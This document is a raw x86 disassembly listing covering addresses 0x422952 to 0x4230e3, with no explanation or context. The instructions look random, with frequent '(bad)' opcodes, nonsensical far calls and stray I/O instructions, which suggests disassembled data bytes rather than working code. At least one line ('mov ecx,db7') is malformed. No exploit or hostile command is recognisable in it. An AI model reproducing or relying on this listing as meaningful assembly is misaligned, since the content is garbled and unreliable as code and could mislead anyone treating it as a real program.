  422952:	or     BYTE PTR [ecx-0x404c48e],dh
  422958:	dec    ecx
  422959:	mov    bl,0x94
  42295b:	je     0x422934
  42295d:	call   0xd08f:0x2f0a0f33
  422964:	add    DWORD PTR [eax],eax
  422966:	arpl   WORD PTR [eax],ax
  422968:	add    BYTE PTR [eax],al
  42296a:	xchg   BYTE PTR [edx+0x2d],dh
  42296d:	or     al,0x79
  42296f:	loope  0x42296a
  422971:	sahf   
  422972:	mov    ecx,0xc2c76e82
  422977:	xchg   edx,eax
  422978:	mov    esi,0x577828f6
  42297d:	leave  
  42297e:	int3   
  42297f:	and    esi,DWORD PTR [ebx]
  422981:	rcr    DWORD PTR [edi+edi*4],0x7b
  422985:	out    0x32,eax
  422987:	test   al,0x30
  422989:	push   edx
  42298a:	mov    ds:0xd66f10a2,eax
  42298f:	and    eax,0x5083ccf1
  422994:	pop    DWORD PTR [edx+0x75]
  422997:	rol    DWORD PTR [ebp-0x2c],1
  42299a:	jbe    0x4229cc
  42299c:	(bad)  
  42299d:	hlt    
  42299e:	js     0x4229ef
  4229a0:	enter  0xa80c,0xe
  4229a4:	imul   ebp,DWORD PTR [esi+0x6f],0xffffff8c
  4229a8:	sub    ah,BYTE PTR [ebx-0x47]
  4229ab:	push   edi
  4229ac:	cdq    
  4229ad:	adc    al,0x30
  4229af:	or     DWORD PTR [ecx],ebx
  4229b1:	adc    BYTE PTR [di],0xba
  4229b5:	adc    edx,DWORD PTR [esi]
  4229b7:	cmp    bh,BYTE PTR [eax+0x5c4a2631]
  4229bd:	(bad)  
  4229bf:	arpl   WORD PTR ds:0xa15284a6,cx
  4229c5:	or     al,0xbe
  4229c7:	lds    edi,FWORD PTR [esp+edx*4-0x41]
  4229cb:	inc    edx
  4229cc:	push   edi
  4229cd:	add    BYTE PTR [eax],al
  4229cf:	add    BYTE PTR [eax],al
  4229d1:	add    bh,bl
  4229d3:	push   ebx
  4229d4:	mov    dl,0x4f
  4229d6:	mov    esi,0x67d3ffef
  4229db:	xchg   ecx,edi
  4229dd:	adc    al,0x6f
  4229df:	ror    BYTE PTR [ebp+0x1d0f2ac],1
  4229e5:	add    BYTE PTR [ebx+0x0],ah
  4229e8:	add    BYTE PTR [eax],al
  4229ea:	push   ss
  4229eb:	cwde   
  4229ec:	retf   0xc6e0
  4229ef:	les    esi,FWORD PTR [ebp-0x6d]
  4229f2:	test   BYTE PTR [ebp-0x7],cl
  4229f5:	pusha  
  4229f6:	jb     0x4229e8
  4229f8:	adc    eax,0xb4cf033a
  4229fd:	(bad)  
  4229fe:	(bad)  [edi]
  422a00:	pop    ss
  422a01:	jmp    FWORD PTR [ebp+0x5749c195]
  422a07:	arpl   WORD PTR [ebx+0x40],bp
  422a0a:	adc    DWORD PTR [esi+0x6c2db1d3],ebx
  422a10:	sbb    eax,0x47c856be
  422a15:	sbb    ecx,DWORD PTR [edi-0xb]
  422a18:	stc    
  422a19:	icebp  
  422a1a:	sahf   
  422a1b:	(bad)  
  422a1c:	fnstenv [edi]
  422a1e:	cdq    
  422a1f:	pop    es
  422a20:	lds    eax,FWORD PTR [edx-0x28]
  422a23:	xchg   ebx,eax
  422a24:	test   ah,dl
  422a26:	das    
  422a27:	xor    al,0xef
  422a29:	fild   DWORD PTR [esi-0x3bcc8a62]
  422a2f:	into   
  422a30:	mov    ah,0xfa
  422a32:	inc    ebp
  422a33:	out    dx,eax
  422a34:	and    BYTE PTR [ebx-0x21],bl
  422a37:	std    
  422a38:	sbb    bh,BYTE PTR [eax-0x4a]
  422a3b:	ror    BYTE PTR [ebx+0x7160581b],0xe8
  422a42:	inc    eax
  422a43:	xchg   BYTE PTR [ebx],ch
  422a45:	push   es
  422a46:	shr    DWORD PTR [ebx+eiz*4-0x23],1
  422a4a:	mov    edx,0xe124
  422a4f:	add    BYTE PTR [eax],al
  422a51:	add    BYTE PTR [edi-0x24252cf4],al
  422a57:	fisttp WORD PTR [edi+0x640ccb5d]
  422a5d:	push   ss
  422a5e:	mov    ss,ebp
  422a60:	fild   DWORD PTR [ebp+edx*2+0x630001d1]
  422a67:	add    BYTE PTR [eax],al
  422a69:	add    BYTE PTR [ebx-0x201e326c],bl
  422a6f:	loopne 0x422a38
  422a71:	sub    al,0xc6
  422a73:	out    dx,eax
  422a74:	jp     0x422ac4
  422a76:	retf   
  422a77:	jns    0x422ad2
  422a79:	je     0x422a23
  422a7b:	push   0x1a749dfb
  422a80:	push   ss
  422a81:	or     ebx,DWORD PTR [ebx+0x24]
  422a84:	mov    eax,0x926e4254
  422a89:	sar    DWORD PTR ds:0xb4f21182,cl
  422a8f:	push   esp
  422a90:	sub    DWORD PTR [esp+eax*1-0x11],0xb5d444d4
  422a98:	test   al,0xb4
  422a9b:	clc    
  422a9c:	add    BYTE PTR [ebp-0x19a71ed8],0x79
  422aa3:	(bad)
  422aa7:	mov    ebp,0x722dbe59
  422aac:	(bad)  
  422aad:	xor    ch,bh
  422aaf:	(bad)  
  422ab2:	outs   dx,BYTE PTR ds:[esi]
  422ab3:	inc    edi
  422ab4:	(bad)  
  422ab6:	pop    ds
  422ab7:	xchg   ebx,eax
  422ab8:	jne    0x422af5
  422aba:	std    
  422abb:	cmp    bh,BYTE PTR [ecx]
  422abd:	fistp  WORD PTR ds:0xf822149f
  422ac3:	les    esi,FWORD PTR [edi]
  422ac5:	lahf   
  422ac6:	adc    BYTE PTR [eax+0xf2ee12e],cl
  422acc:	pop    ebp
  422acd:	add    BYTE PTR [eax],al
  422acf:	add    BYTE PTR [eax],al
  422ad1:	add    BYTE PTR [edi-0x28db29d],bl
  422ad7:	jle    0x422a98
  422ad9:	out    dx,eax
  422ada:	sbb    edi,esp
  422adc:	mov    BYTE PTR [ebp+ebx*4-0x475d56f7],dh
  422ae3:	rol    DWORD PTR [ecx],1
  422ae5:	add    BYTE PTR [ebx+0x0],ah
  422ae8:	add    BYTE PTR [eax],al
  422aea:	push   es
  422aeb:	add    DWORD PTR [ecx+0x4efa839b],0xf23ce10d
  422af5:	scas   al,BYTE PTR es:[edi]
  422af6:	into   
  422af7:	inc    eax
  422af8:	fwait
  422af9:	ds jle 0x422abc
  422afc:	jle    0x422b7c
  422afe:	cmp    BYTE PTR [edi+eax*1],0xcf
  422b02:	add    BYTE PTR [eax-0x65],ah
  422b05:	pop    edx
  422b06:	sbb    ch,BYTE PTR [ebx]
  422b08:	test   eax,0xead73c6c
  422b0d:	push   ebx
  422b0e:	cmp    DWORD PTR [ecx+0x78952c9c],0x51
  422b15:	mov    esi,0xeffc042a
  422b1a:	dec    ebx
  422b1b:	cmp    DWORD PTR [eax+edi*2-0x254f204c],edi
  422b22:	cdq    
  422b23:	add    ebp,ebp
  422b25:	ret    0x244d
  422b28:	adc    ah,BYTE PTR ds:[ebx+0x7f45ea9]
  422b2f:	inc    ebp
  422b30:	ret    0x91b2
  422b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b34:	add    ch,ah
  422b36:	jmp    0x422b14
  422b38:	out    0xcd,al
  422b3a:	cmp    BYTE PTR [edx-0x5ed954b1],dh
  422b40:	add    ch,BYTE PTR [esi-0x4c]
  422b43:	mov    ds:0xa2d1eed2,ax
  422b49:	push   edi
  422b4a:	ret    0x51c0
  422b4d:	add    BYTE PTR [eax],al
  422b4f:	add    BYTE PTR [eax],al
  422b51:	add    BYTE PTR [eax+0x23],dh
  422b54:	and    eax,0x7c6f7769
  422b59:	cmp    esp,DWORD PTR [eax-0x504311e4]
  422b5f:	mov    ah,0xae
  422b61:	(bad)  
  422b62:	sbb    edx,edx
  422b64:	add    DWORD PTR [eax],eax
  422b66:	arpl   WORD PTR [eax],ax
  422b68:	add    BYTE PTR [eax],al
  422b6a:	sub    BYTE PTR gs:[ecx+0x47c14d2c],0xe3
  422b72:	dec    ecx
  422b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b74:	rol    dl,1
  422b76:	jne    0x422be4
  422b78:	cmp    eax,0x604057c3
  422b7d:	into   
  422b7e:	jle    0x422bd7
  422b80:	int    0xcf
  422b82:	inc    ecx
  422b83:	jge    0x422b37
  422b85:	fld    DWORD PTR [ecx]
  422b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b88:	and    cl,BYTE PTR [edi+edi*2+0x4fa32fb7]
  422b8f:	inc    eax
  422b90:	int    0xd5
  422b92:	pop    eax
  422b93:	cmc    
  422b94:	jo     0x422b42
  422b96:	xchg   edi,eax
  422b97:	or     eax,0x9d6932b4
  422b9c:	pop    esi
  422b9d:	dec    ebp
  422b9e:	jbe    0x422b26
  422ba0:	or     al,0xff
  422ba2:	call   0xbd8:0xe1604b47
  422ba9:	add    ah,BYTE PTR [ecx+0x67]
  422bac:	cmc    
  422bad:	push   esp
  422bae:	in     eax,dx
  422baf:	inc    ecx
  422bb0:	sbb    edi,DWORD PTR [esi-0x713f068c]
  422bb6:	push   0xbc4c9dc6
  422bbb:	lahf   
  422bbc:	lock cld 
  422bbe:	sbb    al,0x1
  422bc0:	mov    eax,0xab9be9f5
  422bc5:	mov    ebx,0xf3ca3284
  422bca:	mov    bl,0xa5
  422bcc:	mov    BYTE PTR [eax],al
  422bce:	add    BYTE PTR [eax],al
  422bd0:	add    BYTE PTR [eax],al
  422bd2:	xchg   esp,eax
  422bd3:	nop
  422bd4:	ffree  st(0)
  422bd6:	(bad)  
  422bd8:	popf   
  422bd9:	aam    0x57
  422bdb:	(bad)
  422bdf:	in     al,dx
  422be0:	(bad)  
  422be1:	leave  
  422be2:	jle    0x422bb6
  422be4:	add    DWORD PTR [eax],eax
  422be6:	arpl   WORD PTR [eax],ax
  422be8:	add    BYTE PTR [eax],al
  422bea:	xor    al,0x45
  422bec:	arpl   WORD PTR [edx+eiz*4-0x31],dx
  422bf0:	ins    DWORD PTR es:[edi],dx
  422bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bf2:	iret   
  422bf3:	or     cl,BYTE PTR [edi+edi*1+0x21]
  422bf7:	dec    ecx
  422bf8:	mov    bl,0xc3
  422bfa:	mov    al,ds:0x5a8f7d04
  422bff:	retf   0xa046
  422c02:	inc    ebp
  422c03:	popa   
  422c04:	jmp    0xc07b9277
  422c09:	mov    bl,0x13
  422c0b:	lods   al,BYTE PTR ds:[esi]
  422c0c:	sub    edi,0x287b114b
  422c12:	xor    dh,ch
  422c14:	add    DWORD PTR [ebp-0x67f8b287],0xffffffe3
  422c1b:	push   es
  422c1c:	push   ebx
  422c1d:	fwait
  422c1e:	std    
  422c1f:	push   ebx
  422c20:	mov    al,0x7d
  422c22:	in     al,0xfd
  422c24:	add    al,0xcb
  422c26:	cs jno 0x422c6c
  422c29:	mov    edx,0x6752f2da
  422c2e:	lahf   
  422c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c30:	pop    esp
  422c31:	imul   ecx,DWORD PTR [ecx],0xc9469a2e
  422c37:	std    
  422c38:	mov    ebp,ecx
  422c3a:	pop    ebp
  422c3b:	sbb    esp,DWORD PTR [ecx-0xa]
  422c3e:	push   esi
  422c3f:	cmp    DWORD PTR [edi-0x4b],edi
  422c42:	mov    eax,0xb0bd7027
  422c47:	fnstcw WORD PTR [edi]
  422c49:	ret    
  422c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c4b:	mov    BYTE PTR [ebx+0x0],cl
  422c51:	add    ah,dh
  422c53:	mov    dl,0x32
  422c55:	(bad)  
  422c56:	jbe    0x422c2e
  422c58:	hlt    
  422c59:	mov    dl,0xb1
  422c5b:	and    al,0xfe
  422c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5e:	mov    ebx,0xe1921fb4
  422c63:	rol    BYTE PTR [ecx],cl
  422c65:	add    BYTE PTR [ebx+0x0],ah
  422c68:	add    BYTE PTR [eax],al
  422c6a:	ror    DWORD PTR gs:[edx-0x26dfb14e],1
  422c71:	sub    BYTE PTR [esi],0x50
  422c74:	push   edi
  422c75:	cmp    bh,BYTE PTR [esp+esi*8-0xafd80da]
  422c7c:	(bad)  
  422c7d:	(bad)  
  422c7e:	cmc    
  422c7f:	mov    dl,0xf1
  422c81:	in     eax,dx
  422c82:	iret   
  422c83:	loope  0x422c39
  422c85:	inc    edx
  422c86:	sub    BYTE PTR [edi],bh
  422c88:	nop
  422c89:	test   BYTE PTR [edi-0x7b],al
  422c8c:	mov    ecx,0x3fe38fb8
  422c91:	push   esi
  422c92:	mov    ebx,edx
  422c94:	push   edi
  422c95:	stc    
  422c96:	xchg   DWORD PTR [edx],esp
  422c98:	popa   
  422c99:	adc    eax,0x2d08e7f4
  422c9e:	sbb    ebp,ecx
  422ca0:	pusha  
  422ca1:	mov    ds:0x6092c381,al
  422ca6:	adc    al,0x61
  422ca8:	or     al,0xd3
  422caa:	lds    ebx,FWORD PTR [edi+0x434fd06f]
  422cb0:	xlat   BYTE PTR ds:[ebx]
  422cb1:	into   
  422cb2:	cdq    
  422cb3:	push   ebx
  422cb4:	inc    ecx
  422cb5:	test   BYTE PTR [esi+0x6c],al
  422cb8:	in     al,0x77
  422cba:	or     eax,0x81b1e9b4
  422cbf:	ret    
  422cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cc1:	sub    DWORD PTR [ebp+0x5b8d9007],ebp
  422cc7:	fbstp  TBYTE PTR [ecx]
  422cc9:	xchg   ebp,eax
  422cca:	retf   0x9e96
  422ccd:	add    BYTE PTR [eax],al
  422ccf:	add    BYTE PTR [eax],al
  422cd1:	add    BYTE PTR [edx],dh
  422cd3:	ror    esi,cl
  422cd5:	mov    ds:0xd37ebfef,al
  422cda:	sub    edi,DWORD PTR [esi]
  422cdc:	out    0x3f,eax
  422cde:	rcl    DWORD PTR [ebx-0x2cbb159d],cl
  422ce4:	add    DWORD PTR [eax],eax
  422ce6:	arpl   WORD PTR [eax],ax
  422ce8:	add    BYTE PTR [eax],al
  422cea:	mov    BYTE PTR [ebx+0x64361175],ah
  422cf0:	lahf   
  422cf1:	lock xchg esp,eax
  422cf3:	sbb    DWORD PTR [edx+0x22c3a7a8],0x3039a870
  422cfd:	add    eax,0x8c821937
  422d02:	bound  esi,QWORD PTR [esi]
  422d04:	dec    esp
  422d05:	pshufw mm6,QWORD PTR [ebp+0x25],0xfe
  422d0a:	lods   al,BYTE PTR ds:[esi]
  422d0b:	scas   al,BYTE PTR es:[edi]
  422d0c:	push   ecx
  422d0d:	unpckhps xmm5,XMMWORD PTR [edi-0x57b319c0]
  422d14:	mov    ds:0x99b2d9e6,eax
  422d19:	push   ecx
  422d1a:	pushf  
  422d1b:	jbe    0x422d7c
  422d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d1e:	cdq    
  422d1f:	push   esi
  422d20:	ror    DWORD PTR [edi-0x4e8af57b],cl
  422d26:	out    dx,eax
  422d27:	xchg   BYTE PTR [edx],ah
  422d29:	cmp    DWORD PTR [eax],ecx
  422d2b:	pop    esp
  422d2c:	inc    esi
  422d2d:	jle    0x422d49
  422d2f:	sub    DWORD PTR [edi],ecx
  422d31:	or     bh,BYTE PTR [ecx]
  422d33:	retf   
  422d34:	cmp    BYTE PTR [edx-0x2d],dl
  422d37:	pop    edx
  422d38:	pop    ebx
  422d39:	shl    DWORD PTR [eax+0x50],0xf9
  422d3d:	jbe    0x3d2b7649
  422d43:	push   edi
  422d44:	xchg   esi,eax
  422d45:	adc    esi,ebp
  422d47:	xchg   ebp,eax
  422d48:	imul   ebp,ebx,0xffffffed
  422d4b:	out    dx,eax
  422d4c:	arpl   WORD PTR [eax],ax
  422d4e:	add    BYTE PTR [eax],al
  422d50:	add    BYTE PTR [eax],al
  422d52:	fucomi st,st(5)
  422d54:	outs   dx,BYTE PTR ds:[esi]
  422d55:	and    bh,BYTE PTR [esi-0x5d]
  422d58:	(bad)  
  422d5a:	pop    esi
  422d5b:	(bad)  
  422d5c:	mov    DWORD PTR [ebp-0x7ac5d6cc],ecx
  422d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d63:	rol    DWORD PTR [ecx],cl
  422d65:	add    BYTE PTR [ebx+0x0],ah
  422d68:	add    BYTE PTR [eax],al
  422d6a:	sub    BYTE PTR [ebx],dl
  422d6c:	scas   al,BYTE PTR es:[edi]
  422d6d:	scas   al,BYTE PTR es:[edi]
  422d6e:	mov    ds:0x9ba4bd14,al
  422d73:	std    
  422d74:	dec    edx
  422d75:	repz push 0xe49dc472
  422d7b:	mov    ds:0x360f054a,al
  422d80:	add    DWORD PTR [ebx],ecx
  422d82:	pop    ss
  422d83:	add    edi,DWORD PTR [esi+eiz*2-0x36]
  422d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d88:	adc    eax,0x2ae44546
  422d8d:	pushf  
  422d8e:	in     eax,0x39
  422d90:	adc    ebx,esi
  422d92:	stos   DWORD PTR es:[edi],eax
  422d93:	push   ecx
  422d94:	data16 stos BYTE PTR es:[edi],al
  422d96:	pop    ebp
  422d97:	sbb    ebx,DWORD PTR [ecx]
  422d99:	stos   BYTE PTR es:[edi],al
  422d9a:	gs push edx
  422d9c:	jg     0x422d86
  422d9e:	mov    bh,0xb8
  422da0:	push   cs
  422da1:	inc    ebp
  422da2:	mov    bl,0x1c
  422da4:	xchg   ebx,eax
  422da5:	xor    ecx,DWORD PTR [ecx+eiz*4-0x22]
  422da9:	add    ebp,DWORD PTR [ebp+0x78]
  422dac:	aam    0xf9
  422dae:	mov    dh,BYTE PTR [ebp+0x849e83d]
  422db4:	pop    ss
  422db5:	mov    eax,ds:0x882e0b69
  422dba:	cmp    BYTE PTR [ebp+esi*1+0x1a8238e2],dh
  422dc1:	inc    eax
  422dc2:	(bad)  
  422dc3:	sbb    eax,DWORD PTR [eax+0x1817a73c]
  422dc9:	sub    edi,0x4c54
  422dcf:	add    BYTE PTR [eax],al
  422dd1:	add    BYTE PTR ds:0x6f976b22,al
  422dd7:	(bad)  
  422dd9:	mov    dl,0x66
  422ddb:	and    BYTE PTR [esi+0x195e6a6a],ah
  422de1:	pop    ebx
  422de2:	or     dl,ah
  422de4:	add    DWORD PTR [eax],eax
  422de6:	arpl   WORD PTR [eax],ax
  422de8:	add    BYTE PTR [eax],al
  422dea:	fbstp  TBYTE PTR [ecx+ecx*8+0x3bf98755]
  422df1:	mov    cl,0x74
  422df3:	mov    al,0x4
  422df5:	mov    dl,0x92
  422df7:	xchg   edi,eax
  422df8:	int    0xdf
  422dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dfb:	pop    esi
  422dfc:	jmp    0x422e2a
  422dfe:	cmp    ecx,DWORD PTR ds:0x93ae15a0
  422e04:	sahf   
  422e05:	adc    DWORD PTR [edx],esi
  422e07:	push   edi
  422e08:	cmp    ebp,DWORD PTR [ebp+0xa261387]
  422e0e:	jg     0x422e2c
  422e10:	sbb    al,0x26
  422e12:	ins    DWORD PTR es:[edi],dx
  422e13:	or     BYTE PTR [ebx-0x1e],0x2
  422e17:	cmc    
  422e18:	adc    eax,0x829ea8f0
  422e1d:	data16 adc BYTE PTR [ebx+0x7392b251],dl
  422e24:	inc    ebx
  422e25:	and    al,bh
  422e27:	ror    DWORD PTR [ebp-0x79],0x2
  422e2b:	and    edi,DWORD PTR [esp+esi*8-0xe]
  422e2f:	je     0x422eaf
  422e31:	xchg   eax,ebp
  422e33:	lods   al,BYTE PTR ds:[esi]
  422e34:	mov    esp,0xcb66b552
  422e39:	mov    esi,0x27abcf04
  422e3e:	and    eax,0x33b03ae6
  422e43:	cmp    bh,dh
  422e45:	out    dx,eax
  422e46:	sub    ebp,esp
  422e48:	sbb    eax,0xa76f548a
  422e4d:	add    BYTE PTR [eax],al
  422e4f:	add    BYTE PTR [eax],al
  422e51:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e57:	stc    
  422e58:	call   esi
  422e5a:	into   
  422e5b:	inc    ebp
  422e5c:	mov    bh,0x11
  422e5e:	xor    eax,0x6d9ccf7f
  422e63:	aam    0x1
  422e65:	add    BYTE PTR [ebx+0x0],ah
  422e68:	add    BYTE PTR [eax],al
  422e6a:	xchg   edx,eax
  422e6b:	and    DWORD PTR [edx+0x5ee64162],eax
  422e71:	jl     0x422e52
  422e73:	mov    ebx,0xbeac7aaf
  422e78:	mov    bh,0x84
  422e7a:	or     DWORD PTR [esi+0x8],ebx
  422e7d:	imul   edx,DWORD PTR [edi],0xe639ae3b
  422e83:	mov    ah,0xba
  422e85:	(bad)  
  422e86:	mov    esi,ss
  422e88:	fs out 0x56,al
  422e8b:	scas   al,BYTE PTR es:[edi]
  422e8c:	ret    
  422e8d:	jecxz  0x422e9f
  422e8f:	add    eax,0x576eea0e
  422e94:	scas   eax,DWORD PTR es:[edi]
  422e95:	add    al,0x5f
  422e97:	jg     0x422e3e
  422e99:	mov    ebp,0x469c0
  422e9e:	mov    es,WORD PTR [eax+eiz*4]
  422ea1:	bound  esp,QWORD PTR [ebp+0x4bd8c7f3]
  422ea7:	leave  
  422ea8:	iret   
  422ea9:	xchg   edx,eax
  422eaa:	clc    
  422eab:	test   eax,0x510c1417
  422eb0:	add    DWORD PTR [esi-0x68a38ad2],0x3b06a2e1
  422eba:	dec    ebx
  422ebb:	lock icebp 
  422ebd:	call   0x899:0x41d747ab
  422ec4:	fld    TBYTE PTR [ecx]
  422ec6:	sbb    al,BYTE PTR [ecx+0xe3d205d]
  422ecc:	jae    0x422ece
  422ece:	add    BYTE PTR [eax],al
  422ed0:	add    BYTE PTR [eax],al
  422ed2:	fisubr WORD PTR [ecx]
  422ed4:	cwde   
  422ed5:	sar    bh,cl
  422ed7:	repz fisubr WORD PTR ds:0x4af35f6
  422ede:	xchg   edx,eax
  422edf:	dec    edi
  422ee0:	fcomp  st(2)
  422ee2:	rcl    ah,1
  422ee4:	add    DWORD PTR [eax],eax
  422ee6:	arpl   WORD PTR [eax],ax
  422ee8:	add    BYTE PTR [eax],al
  422eea:	test   DWORD PTR [eax],ecx
  422eec:	and    al,0xf5
  422eee:	cs sub eax,0x1e723b44
  422ef4:	js     0x422ef2
  422ef6:	xchg   ebx,eax
  422ef7:	loopne 0x422f13
  422ef9:	es (bad) 
  422efc:	shl    DWORD PTR ds:0x6702866a,0x22
  422f03:	out    0x2c,eax
  422f05:	mov    esp,0xa8cfc895
  422f0a:	xlat   BYTE PTR ds:[ebx]
  422f0b:	pop    es
  422f0c:	les    esp,FWORD PTR gs:[ebx]
  422f0f:	mov    ebp,DWORD PTR fs:[eax]
  422f12:	hlt    
  422f13:	or     ebp,DWORD PTR [ebp+0x10]
  422f16:	cmp    eax,0x6de70aa0
  422f1b:	pop    esp
  422f1c:	in     eax,0x44
  422f1e:	popf   
  422f1f:	mov    edx,0x9e45fe2f
  422f24:	fadd   st,st(2)
  422f26:	xor    eax,0xbb6674c9
  422f2b:	or     al,0xf0
  422f2d:	daa    
  422f2e:	sbb    bl,ch
  422f30:	adc    al,0x46
  422f32:	push   esi
  422f33:	call   0xd00c099
  422f38:	or     BYTE PTR [esi],0x43
  422f3b:	pop    esi
  422f3c:	jmp    0x422f1b
  422f3e:	xchg   DWORD PTR [esi+0x4],edx
  422f41:	mov    ebx,ds
  422f43:	mov    edi,0xa789a01b
  422f48:	push   esi
  422f49:	daa    
  422f4a:	mov    ah,0xba
  422f4c:	xchg   ecx,eax
  422f4d:	add    BYTE PTR [eax],al
  422f4f:	add    BYTE PTR [eax],al
  422f51:	add    BYTE PTR [esi+0x3f],cl
  422f54:	int3   
  422f55:	sbb    eax,0x7fdffffd
  422f5a:	out    dx,eax
  422f5b:	loopne 0x422f73
  422f5d:	lods   al,BYTE PTR ds:[esi]
  422f5e:	loop   0x422fbb
  422f60:	adc    ebp,ecx
  422f62:	xor    edx,ebp
  422f64:	add    DWORD PTR [eax],eax
  422f66:	arpl   WORD PTR [eax],ax
  422f68:	add    BYTE PTR [eax],al
  422f6a:	mov    DWORD PTR [ecx+0x23d37167],esp
  422f70:	add    edi,DWORD PTR [edx+0x62]
  422f73:	data16 jns 0x422fdd
  422f76:	add    eax,0x4de5dff5
  422f7b:	(bad)  
  422f7c:	jg     0x422fe4
  422f7e:	add    al,0x81
  422f80:	jnp    0x422fda
  422f82:	out    dx,al
  422f83:	xor    edx,DWORD PTR [edi-0x133d0a84]
  422f89:	jg     0x422f9b
  422f8b:	rcr    DWORD PTR [edi],cl
  422f8d:	jg     0x422f7c
  422f8f:	sub    ch,BYTE PTR [esp+esi*4-0x28]
  422f93:	pop    edi
  422f94:	fwait
  422f95:	lods   eax,DWORD PTR ds:[esi]
  422f96:	outs   dx,BYTE PTR ds:[esi]
  422f97:	cmc    
  422f98:	and    BYTE PTR [ebx+0x7e],bl
  422f9b:	stc    
  422f9c:	das    
  422f9d:	sub    BYTE PTR [esi-0x4d23fb9e],cl
  422fa3:	(bad)  
  422fa4:	test   BYTE PTR [esi-0x7233e0f4],0x71
  422fab:	jbe    0x423000
  422fad:	jle    0x422f45
  422faf:	inc    edi
  422fb0:	add    dl,BYTE PTR [ebx-0x2de39b20]
  422fb6:	aas    
  422fb7:	push   ecx
  422fb8:	fcomp  QWORD PTR ds:0x86e9b68c
  422fbe:	lods   al,BYTE PTR ds:[esi]
  422fbf:	mov    ds:0xfdb813b8,eax
  422fc4:	push   es
  422fc5:	or     BYTE PTR [edx+0x3ccb3013],bl
  422fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fcc:	mov    bl,0x0
  422fce:	add    BYTE PTR [eax],al
  422fd0:	add    BYTE PTR [eax],al
  422fd2:	push   ds
  422fd3:	test   eax,0x7ff735f6
  422fd8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fde:	sub    DWORD PTR [edi-0x2a69bcef],0x630001
  422fe8:	add    BYTE PTR [eax],al
  422fea:	pcmpgtd mm3,QWORD PTR [edx-0x1]
  422fee:	inc    eax
  422fef:	jmp    0x422fa4
  422ff1:	sbb    BYTE PTR [edi+0x5ee39cf7],ah
  422ff7:	push   es
  422ff8:	dec    ecx
  422ff9:	mov    esp,0xc68b39ad
  422ffe:	pop    ebp
  422fff:	sub    BYTE PTR [esi+0x2225b71b],al
  423005:	scas   al,BYTE PTR es:[edi]
  423006:	push   0x42496c7b
  42300b:	jle    0x42307b
  42300d:	retf   
  42300e:	jmp    0x423066
  423010:	adc    DWORD PTR [ebx+eiz*2],esp
  423013:	aaa    
  423014:	sub    al,0x6e
  423016:	inc    esp
  423017:	inc    esi
  423018:	fcmovnbe st,st(0)
  42301a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42301b:	cdq    
  42301c:	cli    
  42301d:	pushf  
  42301e:	neg    BYTE PTR [eax*8+0x56186474]
  423025:	pop    esi
  423026:	mov    eax,edi
  423028:	(bad)  
  423029:	pushw  0xffa4
  42302c:	es pop ds
  42302e:	jle    0x423019
  423030:	add    edx,DWORD PTR [ecx+0x60]
  423033:	(bad)  
  423034:	fist   WORD PTR [esi]
  423036:	loop   0x423004
  423038:	or     bl,BYTE PTR [ebx-0x5e8b6703]
  42303e:	dec    edx
  42303f:	test   DWORD PTR [esi+0x42cf13ac],eax
  423045:	mov    DWORD PTR [ebp+0x1bab0147],esi
  42304b:	sbb    ah,bl
  42304d:	add    BYTE PTR [eax],al
  42304f:	add    BYTE PTR [eax],al
  423051:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  423057:	lods   eax,DWORD PTR ds:[esi]
  423058:	fcomi  st,st(7)
  42305a:	sar    BYTE PTR [ebx],cl
  42305c:	(bad)  
  42305d:	add    BYTE PTR [esi],ch
  42305f:	arpl   WORD PTR [ecx+0x1d5f985],bx
  423065:	add    BYTE PTR [ebx+0x0],ah
  423068:	add    BYTE PTR [eax],al
  42306a:	loop   0x423065
  42306c:	or     BYTE PTR [edx],bl
  42306e:	mov    ah,0xbf
  423070:	das    
  423071:	pushf  
  423072:	loopne 0x423025
  423074:	(bad)  [eax]
  423076:	jmp    0xaa8887dc
  42307b:	xor    bh,BYTE PTR [edi+0x3799fad6]
  423081:	lock push ss
  423083:	jecxz  0x423070
  423085:	jmp    0x42300d
  423087:	inc    eax
  423088:	dec    esp
  423089:	cdq    
  42308a:	mov    BYTE PTR [edx],ch
  42308c:	fstp   QWORD PTR [ebx]
  42308e:	xor    ebx,DWORD PTR [ebx+0x66]
  423091:	in     eax,dx
  423092:	pop    ecx
  423093:	aaa    
  423094:	loopne 0x4230d7
  423096:	pop    ecx
  423097:	or     eax,0xb552694f
  42309c:	pop    ds
  42309d:	and    al,0x83
  42309f:	mov    dl,0xd2
  4230a1:	and    BYTE PTR [ecx],bh
  4230a3:	adc    ah,bh
  4230a5:	cmp    BYTE PTR [ecx+0x55e5e1f7],bh
  4230ab:	in     eax,0x87
  4230ad:	mov    edx,0xa87149ed
  4230b2:	ss in  eax,dx
  4230b4:	mov    ecx,db7
  4230b7:	mov    ch,0x66
  4230b9:	(bad)  
  4230ba:	nop
  4230bb:	icebp  
  4230bc:	cwde   
  4230bd:	push   0xffffffa5
  4230bf:	and    dh,BYTE PTR [ebx+0x43a08ced]
  4230c5:	enter  0x54a7,0x76
  4230c9:	stos   BYTE PTR es:[edi],al
  4230ca:	stos   DWORD PTR es:[edi],eax
  4230cb:	cwde   
  4230cc:	inc    ebx
  4230cd:	add    BYTE PTR [eax],al
  4230cf:	add    BYTE PTR [eax],al
  4230d1:	add    BYTE PTR [eax],cl
  4230d3:	div    DWORD PTR [edi+0x4a]
  4230d6:	dec    edx
  4230d8:	cmp    eax,0x2e8eedf7
  4230dd:	dec    eax
  4230de:	and    edi,esp
  4230e0:	dec    eax
  4230e1:	in     al,0x5c
  4230e3:	(bad)  
